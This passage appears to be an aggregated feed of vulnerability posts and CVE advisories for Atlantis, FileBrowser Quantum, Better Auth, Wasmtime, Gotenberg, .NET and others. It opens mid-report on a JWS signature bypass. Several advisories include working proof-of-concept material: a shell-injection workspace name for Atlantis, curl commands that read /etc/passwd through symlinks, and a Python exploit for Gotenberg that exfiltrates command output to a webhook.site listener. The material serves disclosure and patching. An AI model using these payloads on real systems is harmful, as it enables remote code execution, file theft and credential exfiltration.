    ACCEPTED (expected) payload= b'{"sub":"attacker","role":"admin"}'
[D] CONTROL- same object, first signature corrupted
    rejected (expected): BadSignatureError bad_signature:
[E] CONTROL- signatures array removed entirely (not empty, absent)
    rejected: DecodeError Missing "protected" value:
```

[C] proves the verifier works normally on a genuine object, so a deployment looks healthy. [D] proves
tampering is caught. [E] proves this is specifically the empty-array case and not a general
missing-member bug. [A] and [B] are the bypass, and [B] shows that holding the correct key does not
save a caller: the empty array is accepted either way.

For comparison, joserfc 1.7.5, the library this module's deprecation warning points users to, rejects
the identical object with `BadSignatureError`. The correct behaviour already exists in your newer
library.

## Impact

Any relying party that calls `JsonWebSignature.deserialize_json()` on input it did not produce will
accept an attacker-authored payload as signed. Where that payload carries identity or authorisation
claims, this is a complete authentication bypass by an unauthenticated remote caller with no key
material. 

## What would fix it

In `_deserialize_json`, reject an empty `signatures` array before the loop, or initialise the flag
from the signature count, for example `is_valid = len(obj["signatures"]) > 0`. Pull request #938
proposes the same thing.

Hey gang, the #infosec datascape is on fire again. And do *you* have any #IoT devices?

Critical vulnerabilities were disclosed in the #GoAhead embedded web server, affecting devices from major manufacturers like Palo Alto Networks, #Siemens, and #Boeing. The vulnerability impacts hundreds of millions of IoT, industrial control, and network devices, as many vendors have not yet issued firmware updates to address these specific flaws.

The most severe flaw, CVE-2026-115881 (CVSS 9.1), allows revoked client certificates to bypass security checks in OpenSSL, a critical risk for mutual-TLS (mTLS) configurations.

Also a weak key exchange in the Mbed TLS backend (CVSS 5.9) that can enable passive session decryption, and a certificate chain bypass in LibreSSL builds (CVSS 7.4).

Additionally, a login bypass vulnerability allows authentication with any password if the user's password is stored in the newer Blowfish format.

https://cybersecuritynews.com/goahead-tls-vulnerabilities/

🟠 CVE-2026-116676 - High (8.8)

Atlantis is a self-hosted golang application that listens for Terraform pull request events via webhooks. From version 0.4.0 until 0.47.1, Atlantis passes the pull-request-controlled workspace value from atlantis.yaml into Terraform command argume...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-116676/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-116676.description:
### Summary

Atlantis passes the Terraform `workspace` value from a pull request's `atlantis.yaml` into a shell command without quoting or escaping it.

A contributor whose pull request is eligible for an Atlantis plan can include shell metacharacters in the workspace name and execute arbitrary commands as the Atlantis service account. This does not require custom workflows, `allow_custom_workflows`, or permission to run `terraform apply`.

The executed command inherits the Atlantis process environment, which commonly contains cloud-provider, Terraform, and VCS credentials.

### Details

Verified against current `upstream/main` commit `92ce5c51d1a050357e44df3535483425e59fa984` on August 13, 2026.

The vulnerable data flow is:

1. The PR-controlled project workspace is validated in [`server/core/config/raw/project.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/config/raw/project.go#L139-L149).

   Validation rejects only `..`, `/`, and `\`. Shell metacharacters such as `;`, `#`, `$`, redirections, and whitespace remain permitted.

2. The workspace is passed directly as a Terraform command argument in [`server/core/runtime/workspace_step_runner_delegate.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/runtime/workspace_step_runner_delegate.go#L86-L96):

   ```go
   []string{workspaceCmd, "select", ctx.Workspace}
   ```

3. Terraform arguments are concatenated into a single string using `strings.Join(args, " ")` in [`server/core/terraform/tfclient/terraform_client.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/terraform/tfclient/terraform_client.go#L451-L468):

   ```go
   tfCmd := fmt.Sprintf("%s %s", binPath, strings.Join(args, " "))
   ```

4. The resulting string is executed through `sh -c` in [`server/core/terraform/tfclient/terraform_client.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/terraform/tfclient/terraform_client.go#L416-L427):

   ```go
   cmd := exec.Command("sh", "-c", tfCmd)
   ```

Consequently, a workspace such as:

```text
poc;id;false;#
```

produces commands equivalent to:

```sh
terraform workspace select poc;id;false;#
terraform workspace new poc;id;false;#
```

`raw.Project.Validate()` was confirmed to return no error for this workspace value.

Atlantis documents that planning untrusted Terraform can already be dangerous because providers and external data sources execute code. The distinct issue here is that an ordinary project configuration field becomes shell source, bypassing the explicit `allow_custom_workflows` control and requiring no malicious provider, external data source, custom workflow, or apply operation.

The primary remediation should be to execute Terraform using an argument vector rather than constructing shell source—for example, `exec.Command(binaryPath, args...)`. Any required environment-variable expansion should be performed without invoking a shell. Strict workspace-name validation would also provide defense in depth.

### PoC

Only reproduce this against a disposable Atlantis instance and test repository.

#### Preconditions

- Atlantis processes `atlantis.yaml` from the pull request branch.
- The pull request is eligible to run `atlantis plan`.
- For a fork pull request, the server must have `--allow-fork-prs` enabled. A same-repository branch does not require this flag.
- No custom workflows or apply permissions are required.

#### Repository contents

Create `main.tf`:

```hcl
terraform {
  required_version = ">= 1.0"
}
```

Create `atlantis.yaml`:

```yaml
version: 3
projects:
  - name: workspace-rce-poc
    dir: .
    workspace: "poc;id;false;#"
    autoplan:
      enabled: false
```

Open a pull request containing these files and comment:

```text
atlantis plan -p workspace-rce-poc
```

#### Expected result

Atlantis first runs `terraform workspace select`. The injected `false` causes that command invocation to return an error, so Atlantis retries using `terraform workspace new`.

On both attempts, the shell executes `id` as a separate command. The second failure includes the combined command output in the Atlantis error response, exposing output similar to:

```text
uid=1000(atlantis) gid=1000(atlantis) groups=1000(atlantis)
```

This demonstrates arbitrary shell-command execution without creating a custom workflow or reaching the apply phase.

The payload uses only `id` and `false` and does not access credentials, make network requests, or modify the host beyond Terraform potentially creating the disposable `poc` workspace.

### Impact

This is an OS command injection vulnerability  resulting in remote code execution as the Atlantis service account.

Affected deployments are those that:

- Process pull-request-controlled `atlantis.yaml` project configuration; and
- Permit the attacker-controlled pull request to trigger an Atlantis plan.

Potential consequences include:

- Reading and exfiltrating cloud-provider, Terraform, and VCS credentials inherited from the Atlantis process.
- Accessing Terraform state, plan files, repository checkouts, caches, and other data available to the Atlantis user.
- Modifying files or binaries accessible to the service account.
- Making network requests using the Atlantis server's network identity.
- Pivoting into infrastructure accessible through the server's credentials or network placement.

For public repositories, arbitrary external contributors are directly exposed when `--allow-fork-prs` is enabled. Without fork PR support, the vulnerable population includes users able to create eligible same-repository pull requests and attackers controlling such accounts.

🟠 CVE-2026-116682 - High (8.6)

FileBrowser Quantum is a free, self-hosted, web-based file manager. Prior to 1.5.2-stable and 2.0.1-beta, file read handling in backend/pkg/indexing/indexingFiles.go resolves symbolic links through GetRealPath without confirming that the resolved ...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-116682/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-116682.description:
## Summary

File read paths resolve symbolic links with `filepath.EvalSymlinks` and then operate on the resolved target without re-checking that the target still lies inside the user's source/scope. 

A symlink located inside a user's accessible directory that points outside the scope (for example to `/etc/passwd`, another tenant's directory, SSH keys, or container secrets) is followed transparently, and its contents are served through the normal download, preview, media, and OnlyOffice endpoints. Any authenticated user with download access can read files anywhere the server process can, whenever such a symlink is reachable in their scope. 

The same symlink-following read path is used by the public share endpoints, which are authorized only by a share hash and not by any account, so when a public share exposes a directory that contains such a symlink, an unauthenticated attacker holding only the share link reads files outside the scope with no credential.

## Details

**1. Symlink resolution performs no containment check (`indexing/iteminfo/utils.go:110-119`)**

```go
func ResolveSymlinks(path string) (string, bool, error) {
    resolvedPath, err := filepath.EvalSymlinks(path)   // follows the link to its real target
    if err != nil {
        return path, false, fmt.Errorf("could not resolve symlinks for %s: %v", path, err)
    }
    info, err := os.Lstat(resolvedPath)
    // ...
    return resolvedPath, IsDirectory(info), nil         // returned with no scope validation
}
```

There is no comparison of `resolvedPath` against the index/scope root.

**2. `GetRealPath` returns the resolved target unchecked (`indexing/indexingFiles.go:991-1008`)**

```go
absolutePath, err := filepath.Abs(joinedPath)
// ...
realPath, isDir, err := iteminfo.ResolveSymlinks(absolutePath)   // escapes scope here
// ...
return realPath, isDir, err
```

`realPath` is then used by file handlers to open and serve the file. No caller re-validates that `realPath` is a descendant of the user's source root. (By contrast, the project did add containment for archive extraction via `symlinkTargetStaysUnderDest`, but that guard is specific to extraction and is not applied to this general read path.)

**3. The read handlers request symlink following, including the unauthenticated public-share handlers (`http/resource.go:96,503`, `http/media.go:124`, `http/onlyOffice.go:133`, `http/public.go:279,441,494`)**

```go
FollowSymlinks: true,
```

Authenticated download, preview, media-subtitle, and OnlyOffice read flows all set `FollowSymlinks: true`, and so do the public share handlers in `http/public.go`. The public download route is registered as `publicApi.HandleFunc("GET /resources/download", withHashFile(publicDownloadHandler))` (`http/httpRouter.go:130`), where `withHashFile` authorizes by the share hash alone with no account, so the same escape is reachable with no authentication when a public share exposes a directory containing the symlink.

## PoC

Confirmed live on `gtstef/filebrowser:1.3.3-stable`. A symlink pointing outside the user's directory must exist inside it; here it is placed on the host volume, which is what happens whenever a bind-mounted directory contains symlinks.

**1. Start a fresh container and seed a file outside the user's intended subtree.**
```bash
docker rm -f fb-q-lab 2>/dev/null; rm -rf /tmp/fb-q-lab; mkdir -p /tmp/fb-q-lab/srv/user1
echo "ROOT_DB_PASSWORD=supersecret" > /tmp/fb-q-lab/srv/secret-outside.txt
docker run -d --name fb-q-lab -p 8090:80 -v /tmp/fb-q-lab/srv:/srv gtstef/filebrowser:1.3.3-stable && sleep 8
TARGET_URL=http://localhost:8090
```

**2. Place symlinks inside the served tree that point outside it.** One points at a host file (`/etc/passwd`), one at the file outside the user's subtree.
```bash
docker exec fb-q-lab sh -c 'ln -sf /etc/passwd /srv/user1/passwd_link; ln -sf /srv/secret-outside.txt /srv/user1/secret_link'
```

### Vector 1: authenticated user (any account with download access)

**3. Log in as the default admin** (the token is passed as the `auth` query parameter).
```bash
ADMIN_TOKEN=$(curl -s -X POST "$TARGET_URL/api/auth/login?username=admin" -H "X-Password: admin" | tr -d '"')
```

**4. Download through the symlinks and read files from outside the scope.**
```bash
curl -s "$TARGET_URL/api/resources/download?file=/user1/passwd_link&source=srv&auth=$ADMIN_TOKEN" | head -1
curl -s "$TARGET_URL/api/resources/download?file=/user1/secret_link&source=srv&auth=$ADMIN_TOKEN"
```

Observed output:
```
[passwd_link] root:x:0:0:root:/root:/bin/sh
[secret_link] ROOT_DB_PASSWORD=supersecret
```

### Vector 2: unauthenticated, via a public share (no account)

**5. The owner creates a public share of the directory** (a normal use of the share feature). This is the only step that needs an account.
```bash
SHARE_HASH=$(curl -s -X POST "$TARGET_URL/api/share?auth=$ADMIN_TOKEN" \
  -H 'Content-Type: application/json' -d '{"path":"/user1","source":"srv"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['hash'])")
```

**6. With only the public share hash and no credential, download through the symlink.**
```bash
curl -s "$TARGET_URL/public/api/resources/download?hash=$SHARE_HASH&file=/passwd_link" | head -1
curl -s "$TARGET_URL/public/api/resources/download?hash=$SHARE_HASH&file=/secret_link"
```

Observed output:
```
[passwd_link] root:x:0:0:root:/root:/bin/sh   (HTTP 200)
[secret_link] ROOT_DB_PASSWORD=supersecret
```

Both vectors follow each symlink to its target and return content from outside the served directory.
Vector 1 works for any scoped non-admin user confined to `/user1`.
Vector 2 needs no account at all, only the public share link, which is why the CVSS score uses `PR:N`.

## Impact

- **Arbitrary file read outside scope:** any authenticated user with download access can read any file the server process can access (host configuration, secrets, SSH keys, `/etc/passwd`, container service-account tokens, other tenants' files).
- **Unauthenticated read via public shares:** because the public share download path follows symlinks and is authorized only by the share hash, an attacker with no account reads the same out-of-scope files using only a public share link to a directory that contains such a symlink. This is the `PR:N` worst case driving the score.
- **Cross-tenant data exposure:** in multi-user deployments, one user reads other users' scoped files through a symlink.
- **Broad sink coverage:** the same gap affects authenticated download, preview, media/subtitle, and OnlyOffice read flows and the public share handlers, all of which follow symlinks.
- **Precondition:** a symlink pointing outside the scope must be reachable in the served directory (for the unauthenticated vector, inside a publicly shared directory). This is common where host directories are bind-mounted (the typical Docker deployment) or where scopes overlap shared storage.

## Recommended Fix

After resolving symlinks, verify the resolved real path is still contained within the user's source root, and reject otherwise:

```go
// indexing/indexingFiles.go, GetRealPath, after ResolveSymlinks:
rootReal, _ := filepath.EvalSymlinks(idx.Path)
rel, err := filepath.Rel(rootReal, realPath)
if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(os.PathSeparator)) {
    return "", false, fmt.Errorf("resolved path escapes source scope")
}
```

Apply the same containment check (or reuse the existing `symlinkTargetStaysUnderDest` logic) on every read path that sets `FollowSymlinks: true`. As a deployment-hardening option, add a setting to refuse to follow symlinks that leave the source root entirely.

CVE-2026-57202.description: Asterisk is an open source private branch exchange and telephony toolkit. Prior to Asterisk 20.20.1, 21.12.3, 22.10.1, 23.4.1 and Certified Asterisk 20.7-cert11, 22.8-cert3, an authenticated Asterisk REST Interface (ARI) attacker with read-only privileges may use `setChannelVar` to execute write dialplan functions, including `FILE()` writes, even when `live_dangerously` in `asterisk.conf` is set to no. The Asterisk HTTP web server must be enabled and reachable, and the attacker must already have valid `read-only ARI credentials`. HTTP is disabled by default and binds only to 127.0.0.1 by default even when enabled. This issue is fixed in Asterisk 20.20.1, 21.12.3, 22.10.1, 23.4.1 and Certified Asterisk 20.7-cert11, 22.8-cert3.

posts.content:
Better than what?

https://nvd.nist.gov/vuln/detail/cve-2026-114607

Better Auth is an authentication and authorization library for TypeScript. From 1.4.0-beta.18 until 1.7.7, deployments that enable Magic Link with storeToken set to plain, or with storeToken set to hashed and the global verification.storeIdentifier setting also set to hashed, enable a built-in social or Generic OAuth provider, and use account.storeStateStrategy set to database can accept an OAuth sign-in state value as a Magic Link token. These settings can cause Magic Link verification records and OAuth state to resolve to the same stored identifier, allowing an unauthenticated attacker to start OAuth sign-in for a known email address and redeem the returned state through Magic Link without controlling the mailbox or completing the provider callback. The attacker can obtain a normal session for an existing user, or create an account incorrectly marked as email verified when sign-up is enabled. This issue is fixed in version 1.7.7.

CVE-2026-114607.description:
## Am I affected?

You may be affected if you use `better-auth` from `1.4.0-beta.18` through versions before `1.7.7` with the Magic Link plugin and social or Generic OAuth sign-in.

You are affected if **all** of these are true:

- Magic Link is enabled with default `storeToken: "plain"`, or with `storeToken: "hashed"` and global `verification.storeIdentifier: "hashed"` (including a hashed default).
- At least one built-in social provider or Generic OAuth provider is enabled.
- OAuth state uses `account.storeStateStrategy: "database"`, the default when a database or secondary storage is configured.

Cookie-backed state blocks this path, subject to the OAuth Proxy condition below. With custom hashers, confirm the flows cannot resolve to the same stored identifier.

## Summary

Better Auth accepts an OAuth sign-in state value as a Magic Link token. An attacker can start an OAuth sign-in with any email address and use the returned state value to finish a Magic Link sign-in for that address. They never prove that they can read that email.

## Impact

An unauthenticated attacker who knows a user's email address can get a normal session for that user, with all of that account's permissions. They need no access to the mailbox, and they do not need to sign in with the OAuth provider or complete an OAuth callback.

If Magic Link sign-up is enabled and no user has the email address, the attacker can instead create an account that Better Auth wrongly marks as email verified, and is signed in to it. The false verified-email flag can also bypass Better Auth's default unproven-account protections when the mailbox owner later signs in, leaving the attacker's session in that account. Applications that trust verified email addresses or email domains may give this account more access, depending on the application.

## Patches

The fix is merged for the planned `better-auth` 1.7.7 release. That package is not available yet.

Upgrade `better-auth` and installed Better Auth adapters, plugins, and integrations released alongside it together. Upgrade servers sharing verification storage in the same cutover. Request new Magic Links and restart pending OAuth or SAML sign-ins; links and state created before the upgrade cannot complete. Update custom `verification.storeIdentifier.overrides` rules to match the `magic-link:` and `auth-state:` prefixes. There is no user or account data migration, and public token values and API signatures are unchanged.

## Workarounds

Until you upgrade to the fixed release, use one of these mitigations:

- Set `account.storeStateStrategy` to `"cookie"`. If you also use OAuth Proxy, first configure one dedicated OAuth Proxy `secret` across all participating environments that differs from each environment's global Better Auth secret. Cookie-backed state can expose a separate OAuth Proxy account-takeover path when the proxy shares the global secret and implicit account linking is enabled.
- Set the Magic Link plugin option `storeToken` to `"hashed"` **and** leave global `verification.storeIdentifier` unset or set it to `"plain"`. Global identifier hashing does not prevent this issue when Magic Link tokens are also hashed.
- Turn off Magic Link sign-in, or turn off social and Generic OAuth sign-in.

Setting `disableSignUp: true` on the Magic Link plugin is not enough. It only stops the creation of new verified accounts. It does not stop the takeover of existing accounts.

Apple Patches Exploited CoreGraphics Flaw and Hundreds of Vulnerabilities in October 2026 Security Update

On October 26, 2026, Apple released security updates across iOS, iPadOS, macOS, tvOS, watchOS, visionOS and Safari, patching several hundred vulnerabilities concentrated in WebKit, the kernel, ImageIO and CoreStorage. **If you use any Apple device (iPhone, iPad, Mac, Apple Watch, Apple TV or Vision Pro), update it now. The current versions are iOS/iPadOS 27.2, 26.7.2 or 18.7.11, macOS Golden Gate 27.2, Tahoe 26.7.2 or Sequoia 15.8.2, tvOS/watchOS/visionOS 27.2, and Safari 27.2. If you still use an iPhone XS, XS Max or XR, install iOS 18.7.11 first: it fixes a flaw that has been exploited in targeted attacks. Until you've updated, be extra careful about unfamiliar websites, files, images and fonts from strangers, and connecting to unknown file-sharing or Screen Sharing servers.**

posts.content:
🚨 Two critical Wasmtime flaws could allow malicious WebAssembly modules to escape the runtime sandbox

Both vulnerabilities affect Cranelift, Wasmtime’s default compiler, and carry CVSS scores of 9.9.
⠀
CVE-2026-115889 affects all processor architectures and can trigger silent compiler errors that generate incorrect machine code.

CVE-2026-115893 affects ARM64 systems and can cause large br_table instructions to jump to the wrong code location.
⠀
Exploitation requires a vulnerable Wasmtime instance to compile an attacker-controlled WebAssembly module. Services that accept and execute untrusted customer modules face the greatest risk.

Fixed versions:

• Wasmtime 36.0.19
• Wasmtime 48.0.7
• Wasmtime 49.0.4
• Wasmtime 50.0.0 or later

No exploitation in the wild has been reported.

Sources: https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-897f-g5gm-fmxm

https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-mghf-wjfp-p5xm

CVE-2026-115889.description:
## Summary

In Wasmtime prior to v43, the Cranelift compiler backend bit-packs its SSA value indices in a way that can result in silent overflow in release builds, and result in incorrect value references in the IR resulting in arbitrary miscompilation. A very large Wasm function body, or one that is specially crafted to use many SSA values, can use this to force type-confusion or other arbitrary side-effects and escape the sandbox.

Cranelift was changed in Wasmtime v43 to use a full `u32` index, with checks if that limit is exceeded, and so is no longer susceptible to this bug.

## Impact

A Wasmtime engine with default settings (using the Cranelift backend) on any architecture/platform could experience a sandbox escape from a specially-crafted Wasm module.

## Patches

Wasmtime v36.0.19 has been released which fixes this issue.

CVE-2026-115893.description: Wasmtime is a runtime for WebAssembly. Prior to 36.0.19, 48.0.7, and 49.0.4, the Cranelift compiler backend on aarch64 can compile a Wasm br_table instruction with more than approximately 256,000 targets so that it has an incorrect conditional branch target. The branch can then jump to arbitrary other code at a user-controlled offset, allowing a user-controlled Wasm module to escape the sandbox on aarch64 engines using the default Cranelift backend. This issue is fixed in versions 36.0.19, 48.0.7, and 49.0.4.

posts.content: CVE-2026-92885: Qode Membership plugin (≤2.0.6.2) suffers a CRITICAL auth bypass (CVSS 9.8). Typo in Facebook OAuth check lets attackers hijack any WordPress account — including admins. Remove or restrict plugin use now. https://radar.offseq.com/threat/cve-2026-92885-cwe-287-improper-authentication-in-qode-themes-qode-membership-038e4dcfed22c95b #OffSeq #WordPress #Vuln

CVE-2026-92885.description: The Qode Membership plugin for WordPress is vulnerable to Authentication Bypass leading to Account Takeover in all versions up to, and including, 2.0.6.2 via the qode_membership_check_facebook_user AJAX action. This is due to a typographic error in the Facebook OAuth token verification guard within the qode_membership_login_user_from_social_network function — the guard condition tests an undefined variable ($check_social_useqoder instead of $check_social_user), causing empty() to always return true and rendering the Graph API token verification branch dead code, leaving wp_set_auth_cookie() reachable with no credential or token validation whatsoever. This makes it possible for unauthenticated attackers to log in as any existing WordPress account — including Administrator-level accounts — by supplying a known or enumerated administrator login name (rather than an email address) in the response[email] parameter, which the fallback path in get_user_by('login', $email) resolves to the matching account. Exploitation does require harvesting a valid qode_validate_facebook_login nonce, but this nonce is rendered on any public front-end page containing the [qode_user_login] or [qode_user_register] shortcode and is therefore obtainable without any prior authentication.

New.

"The vulnerability, CVE-2026-42589, allows an attacker to inject ExifTool arguments through unsanitized metadata keys. By inserting newlines into a JSON key, an attacker can inject the -if argument and execute arbitrary Perl code. The vulnerability carries a CVSS score of 9.8 and was fixed in Gotenberg 8.31.0."

VulnCheck: Cache Me If You Can: Unpacking a Go Implant and Its Toolkit https://www.vulncheck.com/blog/cache-me-if-you-can @vulncheck #opensource #infosec #threatresearch

CVE-2026-42589.description:
# Unauthenticated RCE in Gotenberg via Metadata Key Newline Injection

## Summary

Gotenberg's `/forms/pdfengines/metadata/write` HTTP endpoint accepts a JSON metadata object and passes its keys directly to ExifTool via the go-exiftool library. No validation is performed on key characters. A `\n` embedded in a JSON key splits the ExifTool stdin stream into a new argument line, allowing an attacker to inject arbitrary ExifTool flags — including `-if`, which evaluates Perl expressions. This achieves unauthenticated OS command execution in a single HTTP request. The response is HTTP 200 with a valid PDF, making the attack transparent to basic monitoring.

## Vulnerability Details

| Field            | Value                                    |
|------------------|------------------------------------------|
| Product          | Gotenberg                                |
| Version          | 8.29.1 (default `gotenberg/gotenberg:8`) |
| Component        | `pdfengines/metadata/write` endpoint     |
| CWE              | CWE-78 — Improper Neutralization of Special Elements used in an OS Command |

## Affected Code

**Product:** Gotenberg  
**Endpoint:** `/forms/pdfengines/metadata/write`  
**Root cause:** JSON metadata keys are passed to go-exiftool without control-character
validation. The existing `dangerousTags` blocklist uses exact-match deletion and
provides no defense against `\n`-embedded keys.

The injection occurs because go-exiftool writes each key to ExifTool's stdin as:

```go
fmt.Fprintln(e.stdin, "-"+k+"="+str)   // k contains \n → splits into a new argument line
```

When `k` is `Title\n-if\nsystem('cmd')||1\n-Comment`, ExifTool's stdin becomes:

```
-Title
-if
system('cmd')||1
-Comment=x
```

ExifTool's `-if` flag evaluates its argument as a Perl expression, giving the attacker arbitrary code execution.

**Why it's vulnerable:** Gotenberg is the HTTP entry point. It controls what data enters go-exiftool. The `dangerousTags` blocklist (`FileName`, `Directory`) shows that the authors are aware that certain keys are dangerous, but the fix is incomplete: it uses exact string matching and does not strip or reject control characters in keys.
This vulnerability exists entirely within Gotenberg's responsibility and is independently fixable without changing go-exiftool.

## Attack Scenario

**Threat actor:** Unauthenticated remote attacker  
**Preconditions:** Gotenberg port 3000 is reachable (common in internal/cloud deployments)  

1. Attacker sends a POST request to `/forms/pdfengines/metadata/write` with any valid PDF and a metadata JSON object whose key contains embedded newlines.
2. Gotenberg deserializes the JSON key — `\n` is preserved as a literal newline in Go's  `map[string]any` after `json.Unmarshal`.
3. The key is forwarded to go-exiftool, which writes it verbatim to ExifTool's stdin, splitting it across multiple argument lines.
4. ExifTool processes `-if system('cmd')||1` as a Perl expression and executes `cmd`.
5. The attacker exfiltrates output via an OOB HTTP callback. Response to the attacker is HTTP 200 with a valid PDF — no error signal.

## Proof of Concept

```bash
# Write output of `id` to /tmp/pwned on the server
curl -s -o /dev/null -w "HTTP:%{http_code}" \
  -X POST http://TARGET:3000/forms/pdfengines/metadata/write \
  -F 'files=@sample.pdf;type=application/pdf' \
  --form-string $'metadata={"Title\\n-if\\nsystem(\'id>/tmp/pwned\')||1\\n-Comment": "x"}'
# → HTTP:200
# On server: uid=1001(gotenberg) gid=1001(gotenberg) groups=1001(gotenberg),0(root)
```

OOB exfiltration via base64-encoded HTTP callback:

```bash
OOB="https://webhook.site/YOUR-ID"
curl -s -o /dev/null -w "HTTP:%{http_code}" \
  -X POST http://TARGET:3000/forms/pdfengines/metadata/write \
  -F 'files=@sample.pdf;type=application/pdf' \
  --form-string "metadata={\"Title\n-if\nsystem('wget -q -O /dev/null \"${OOB}?c=\$(id|base64|tr -d \\\"=\\n\\\")\" 2>/dev/null')||1\n-Comment\": \"x\"}"
# Listener receives: GET /?c=dWlkPTEwMDEoZ290ZW5iZXJnKS4u
# Decode: echo dWlkPTEwMDEoZ290ZW5iZXJnKS4u | base64 -d → uid=1001(gotenberg)...
```

Self-contained Python PoC (auto-generates PDF from target, exfiltrates via OOB):

```python
#!/usr/bin/env python3
"""
Usage: python3 poc.py <target> <oob_url> [command]
  python3 poc.py http://localhost:3000 https://webhook.site/YOUR-ID
  python3 poc.py http://10.0.0.5:3000 https://webhook.site/YOUR-ID "cat /etc/passwd"
"""
import sys, json, subprocess, urllib.request

def check_target(target):
    with urllib.request.urlopen(f"{target}/version", timeout=5) as r:
        print(f"[+] Gotenberg {r.read().decode().strip()} — target reachable")

def get_pdf(target):
    r = subprocess.run(["curl", "-s", "-X", "POST", f"{target}/forms/chromium/convert/url",
                        "-F", "url=https://example.com"], capture_output=True, timeout=30)
    assert r.stdout[:4] == b"%PDF", "Failed to generate PDF"
    print(f"[+] Got sample PDF ({len(r.stdout)} bytes)")
    return r.stdout

def exploit(target, pdf, oob, cmd):
    import tempfile, os
    key  = f'Title\n-if\nsystem(\'wget -q -O /dev/null "{oob}?c=$({cmd}|base64|tr -d "=\\n")" 2>/dev/null\')||1\n-Comment'
    meta = json.dumps({key: "x"})
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
        f.write(pdf); tmp = f.name
    try:
        r = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                            "-X", "POST", f"{target}/forms/pdfengines/metadata/write",
                            "-F", f"files=@{tmp};type=application/pdf",
                            "--form-string", f"metadata={meta}"],
                           capture_output=True, text=True, timeout=30)
        return int(r.stdout.strip())
    finally:
        os.unlink(tmp)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(__doc__); sys.exit(1)
    target, oob = sys.argv[1].rstrip("/"), sys.argv[2]
    cmd = sys.argv[3] if len(sys.argv) > 3 else "id"
    print(f"[*] Target: {target} | OOB: {oob} | Command: {cmd}")
    check_target(target)
    pdf    = get_pdf(target)
    status = exploit(target, pdf, oob, cmd)
    if status == 200:
        print(f"[+] HTTP {status} — payload fired, check OOB listener for: ?c=<base64({cmd})>")
        print(f"[!] Decode with: echo <value> | base64 -d")
    else:
        print(f"[-] HTTP {status} — unexpected response")
```

Expected output:
```
[*] Target: http://localhost:3000 | OOB: https://webhook.site/... | Command: id
[+] Gotenberg 8.29.1 — target reachable
[+] Got sample PDF (12345 bytes)
[+] HTTP 200 — payload fired, check OOB listener for: ?c=<base64(id)>
```

## Impact

Full unauthenticated remote code execution as the Gotenberg process user (`uid=1001(gotenberg)`, member of `root` group in the default Docker image). An attacker can read arbitrary files, write files, establish reverse shells, or pivot within the network. The attack requires no credentials and returns no error signal. Any deployment that exposes Gotenberg's port 3000 without an authenticating proxy is fully compromised by a single HTTP request.

## Remediation

In Gotenberg's metadata handler, reject any key containing control characters before passing it to go-exiftool:

```go
import "strings"

for key := range metadata {
    if strings.ContainsAny(key, "\n\r\x00") {
        return fmt.Errorf("invalid metadata key %q: control characters not allowed", key)
    }
}
```

Operators should also place Gotenberg behind an authenticated reverse proxy and never expose port 3000 directly to untrusted networks.

**Note:** A companion advisory covers the same class of injection at the go-exiftool library layer (independently fixable — see go-exiftool advisory).

## Timeline

| Date       | Event                                      |
|------------|--------------------------------------------|
| 2026-04-04 | Vulnerability discovered                   |
| 2026-04-04 | RCE confirmed — local file write + OOB HTTP |
| 2026-04-04 | Report drafted for disclosure              |
| 2026-04-08 | Split into separate per-product advisories |

## Resources

🚨 Microsoft issues emergency .NET updates after earlier patches failed to fully fix two vulnerabilities

Microsoft says its October 13 updates did not completely address CVE-2026-102870 and CVE-2026-70197, prompting new out-of-band security releases for .NET 8, 9, 10 and 11.
⠀
CVE-2026-102870 is a high-severity remote code execution flaw in the Blazor WebAssembly debugger.

Attacker-controlled data from a debugged application could escape a generated C# string and execute code on a developer’s computer when they evaluate an expression. The vulnerability has a CVSS score of 8.8 and requires user interaction.
⠀
The emergency updates also address:

• CVE-2026-70197, a SocketAsyncEventArgs memory corruption flaw
• CVE-2026-111497, a Brotli decoder out-of-bounds write
• CVE-2026-114148, a Linux source-build tarball ownership issue
⠀
Microsoft warns that updating the shared .NET runtime alone is not enough to fix the Blazor vulnerability when affected NuGet packages are referenced directly.

Developers should update Microsoft.AspNetCore.Components.WebAssembly.Server and DevServer to patched releases, including version 10.0.14 for .NET 10 projects.

Source: https://devblogs.microsoft.com/dotnet/dotnet-october-2026-oob-security-updates

CVE-2026-70197.description: Out-of-bounds write in .NET allows an unauthorized attacker to execute code over a network.

CVE-2026-102870.description: ## Executive summary Microsoft is releasing this security advisory to provide information about a vulnerability in the Blazor WebAssembly debugger included in `Microsoft.AspNetCore.Components.WebAssembly.Server`. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability. The Blazor WebAssembly debug proxy evaluates debugger expressions by generating and compiling C# source. Certain values originating in the application being debugged, including `ToString()` results, descriptions, and class names, are embedded in that generated source without consistent escaping. An attacker-controlled value can escape the generated string literal and execute code on a developer's machine when the developer evaluates an expression during debugging. ## Announcement Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/445 ## CVSS Details - **Version:** 3.1 - **Severity:** High - **Score:** 8.8 - **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` - **Weakness:** CWE-94 (Improper Control of Generation of Code ('Code Injection')) ## Affected Platforms - **Platforms:** Windows, Linux, macOS - **Architectures:** All ## Affected Packages The vulnerability affects Microsoft .NET projects that use an affected package version listed below. Package name | Affected version | Patched version ------------ | ---------------- | --------------- [Microsoft.AspNetCore.Components.WebAssembly.Server](https://www.nuget.org/packages/Microsoft.AspNetCore.Components.WebAssembly.Server) | >= 10.0.0, <= 10.0.12 | 10.0.13 